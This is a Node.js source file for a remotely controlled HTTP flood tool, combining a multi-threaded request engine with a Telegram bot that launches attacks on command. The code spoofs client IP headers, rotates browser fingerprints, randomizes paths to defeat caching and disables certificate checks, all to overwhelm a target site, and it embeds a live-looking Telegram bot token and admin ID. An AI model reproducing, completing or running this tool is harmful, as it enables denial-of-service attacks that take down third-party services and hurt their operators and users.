const http = require('http');
const https = require('https');
const crypto = require('crypto');
const url = require('url');
const { exec } = require('child_process');

class AdvancedDDoS {
    constructor() {
        this.stats = {
            requests: 0,
            errors: 0,
            success: 0,
            bypassed: 0
        };
        this.startTime = Date.now();
        this.isRunning = false;
    }

    generateBypassHeaders(target) {
        const fingerprints = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ];
        
        return {
            'User-Agent': fingerprints[Math.floor(Math.random() * fingerprints.length)],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'X-Forwarded-For': this.generateRandomIP(),
            'X-Real-IP': this.generateRandomIP(),
            'X-Requested-With': 'XMLHttpRequest'
        };
    }

    generateRandomIP() {
        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }

    randomPath() {
        const paths = [
            `/?_=${Date.now()}`,
            `/api/v1/${crypto.randomBytes(4).toString('hex')}`,
            `/${crypto.randomBytes(6).toString('hex')}.php`,
            `/static/${crypto.randomBytes(8).toString('hex')}`
        ];
        return paths[Math.floor(Math.random() * paths.length)];
    }

    async floodTarget(target, time, rate, threads) {
        this.isRunning = true;
        const parsedUrl = url.parse(target);
        const protocol = parsedUrl.protocol === 'https:' ? https : http;
        const duration = parseInt(time) * 1000;
        const endTime = Date.now() + duration;
        
        console.log(`🚀 Starting Advanced DDoS Attack`);
        console.log(`🎯 Target: ${target}`);
        console.log(`⏱️ Time: ${time}s`);
        console.log(`⚡ Rate: ${rate}ms`);
        console.log(`🧵 Threads: ${threads}`);
        console.log(`🛡️ Bypass Mode: Activated\n`);

        const workers = [];
        
        for (let i = 0; i < threads; i++) {
            workers.push(this.createWorker(protocol, parsedUrl, rate, endTime, i));
        }

        const statsInterval = setInterval(() => {
            this.displayStats();
            if (Date.now() >= endTime || !this.isRunning) {
                clearInterval(statsInterval);
                this.isRunning = false;
                console.log('\n✅ Attack completed!');
                process.exit(0);
            }
        }, 3000);

        await Promise.all(workers);
    }

    createWorker(protocol, target, rate, endTime, workerId) {
        return new Promise((resolve) => {
            const worker = async () => {
                while (Date.now() < endTime && this.isRunning) {
                    try {
                        await this.makeRequest(protocol, target);
                        await new Promise(r => setTimeout(r, rate));
                    } catch (error) {
                        this.stats.errors++;
                    }
                }
                resolve();
            };
            worker();
        });
    }

    makeRequest(protocol, target) {
        return new Promise((resolve) => {
            const headers = this.generateBypassHeaders(target);
            const path = this.randomPath();
            
            const options = {
                hostname: target.hostname,
                port: target.port || (target.protocol === 'https:' ? 443 : 80),
                path: path,
                method: 'GET',
                headers: headers,
                timeout: 10000,
                rejectUnauthorized: false
            };

            const req = protocol.request(options, (res) => {
                this.stats.requests++;
                const status = res.statusCode;
                
                if (status === 200 || status === 201) {
                    this.stats.success++;
                } else if (status >= 300 && status < 400) {
                    this.stats.bypassed++;
                }

                res.on('data', () => {});
                res.on('end', () => resolve());
            });

            req.on('error', () => {
                this.stats.errors++;
                resolve();
            });

            req.on('timeout', () => {
                this.stats.errors++;
                req.destroy();
                resolve();
            });

            req.end();
        });
    }

    displayStats() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const rps = runtime > 0 ? (this.stats.requests / runtime).toFixed(2) : '0';
        
        console.log(`📊 Requests: ${this.stats.requests} | ✅ Success: ${this.stats.success} | 🔄 Bypassed: ${this.stats.bypassed} | ❌ Errors: ${this.stats.errors} | ⚡ RPS: ${rps}`);
    }

    stop() {
        this.isRunning = false;
    }
}

class TelegramBot {
    constructor() {
        this.token = '7580314584:AAFLRinlnilclZpQgXt4fc5uKu2YSUwxH4k';
        this.adminId = '6142661532';
        this.baseUrl = `https://api.telegram.org/bot${this.token}`;
        this.ddos = new AdvancedDDoS();
    }

    async sendMessage(chatId, text) {
        try {
            const response = await fetch(`${this.baseUrl}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: text
                })
            });
            return await response.json();
        } catch (error) {
            console.error('Send message error:', error);
        }
    }

    async handleUpdate(update) {
        if (!update.message) return;
        
        const chatId = update.message.chat.id;
        const text = update.message.text;
        const userId = update.message.from.id;

        if (userId.toString() !== this.adminId) {
            await this.sendMessage(chatId, '❌ Unauthorized access');
            return;
        }

        if (text === '/start') {
            await this.sendMessage(chatId, 
                '🤖 Advanced DDoS Bot\n\n' +
                'Commands:\n' +
                '/start - Show this help\n' +
                '/d target time rate thread - Start attack\n' +
                'Example: /d https://example.com/ 60 100 10\n\n' +
                '⚠️ Use responsibly'
            );
        } else if (text.startsWith('/d ')) {
            await this.handleAttackCommand(chatId, text);
        }
    }

    async handleAttackCommand(chatId, text) {
        const args = text.split(' ').slice(1);
        
        if (args.length < 4) {
            await this.sendMessage(chatId, 
                '❌ Invalid format\n' +
                'Usage: /d target time rate thread\n' +
                'Example: /d https://example.com/ 60 100 10'
            );
            return;
        }

        const [target, time, rate, thread] = args;
        
        if (!target.startsWith('http')) {
            await this.sendMessage(chatId, '❌ Invalid target URL');
            return;
        }

        await this.sendMessage(chatId, '🔄 Đang thực hiện...');

        setTimeout(() => {
            this.startDDoSAttack(target, parseInt(time), parseInt(rate), parseInt(thread));
        }, 1000);
    }

    startDDoSAttack(target, time, rate, thread) {
        console.log(`Starting attack: ${target} ${time}s ${rate}ms ${thread} threads`);
        
        this.ddos.floodTarget(target, time, rate, thread).catch(error => {
            console.error('Attack error:', error);
        });
    }

    async startPolling() {
        let offset = 0;
        
        while (true) {
            try {
                const response = await fetch(`${this.baseUrl}/getUpdates?offset=${offset}&timeout=60`);
                const data = await response.json();
                
                if (data.ok && data.result.length > 0) {
                    for (const update of data.result) {
                        await this.handleUpdate(update);
                        offset = update.update_id + 1;
                    }
                }
            } catch (error) {
                console.error('Polling error:', error);
                await new Promise(resolve => setTimeout(resolve, 5000));
            }
        }
    }
}

if (require.main === module) {
    const args = process.argv.slice(2);
    
    if (args.length === 4) {
        const [target, time, rate, thread] = args;
        const ddos = new AdvancedDDoS();
        ddos.floodTarget(target, parseInt(time), parseInt(rate), parseInt(thread));
    } else if (args.length === 0) {
        const bot = new TelegramBot();
        console.log('🤖 Telegram Bot Started...');
        bot.startPolling();
    } else {
        console.log('Usage:');
        console.log('  node ddos.js target time rate thread');
        console.log('  node ddos.js (to start Telegram bot)');
        console.log('\nExamples:');
        console.log('  node ddos.js https://example.com/ 60 100 10');
        process.exit(1);
    }
}

module.exports = { AdvancedDDoS, TelegramBot };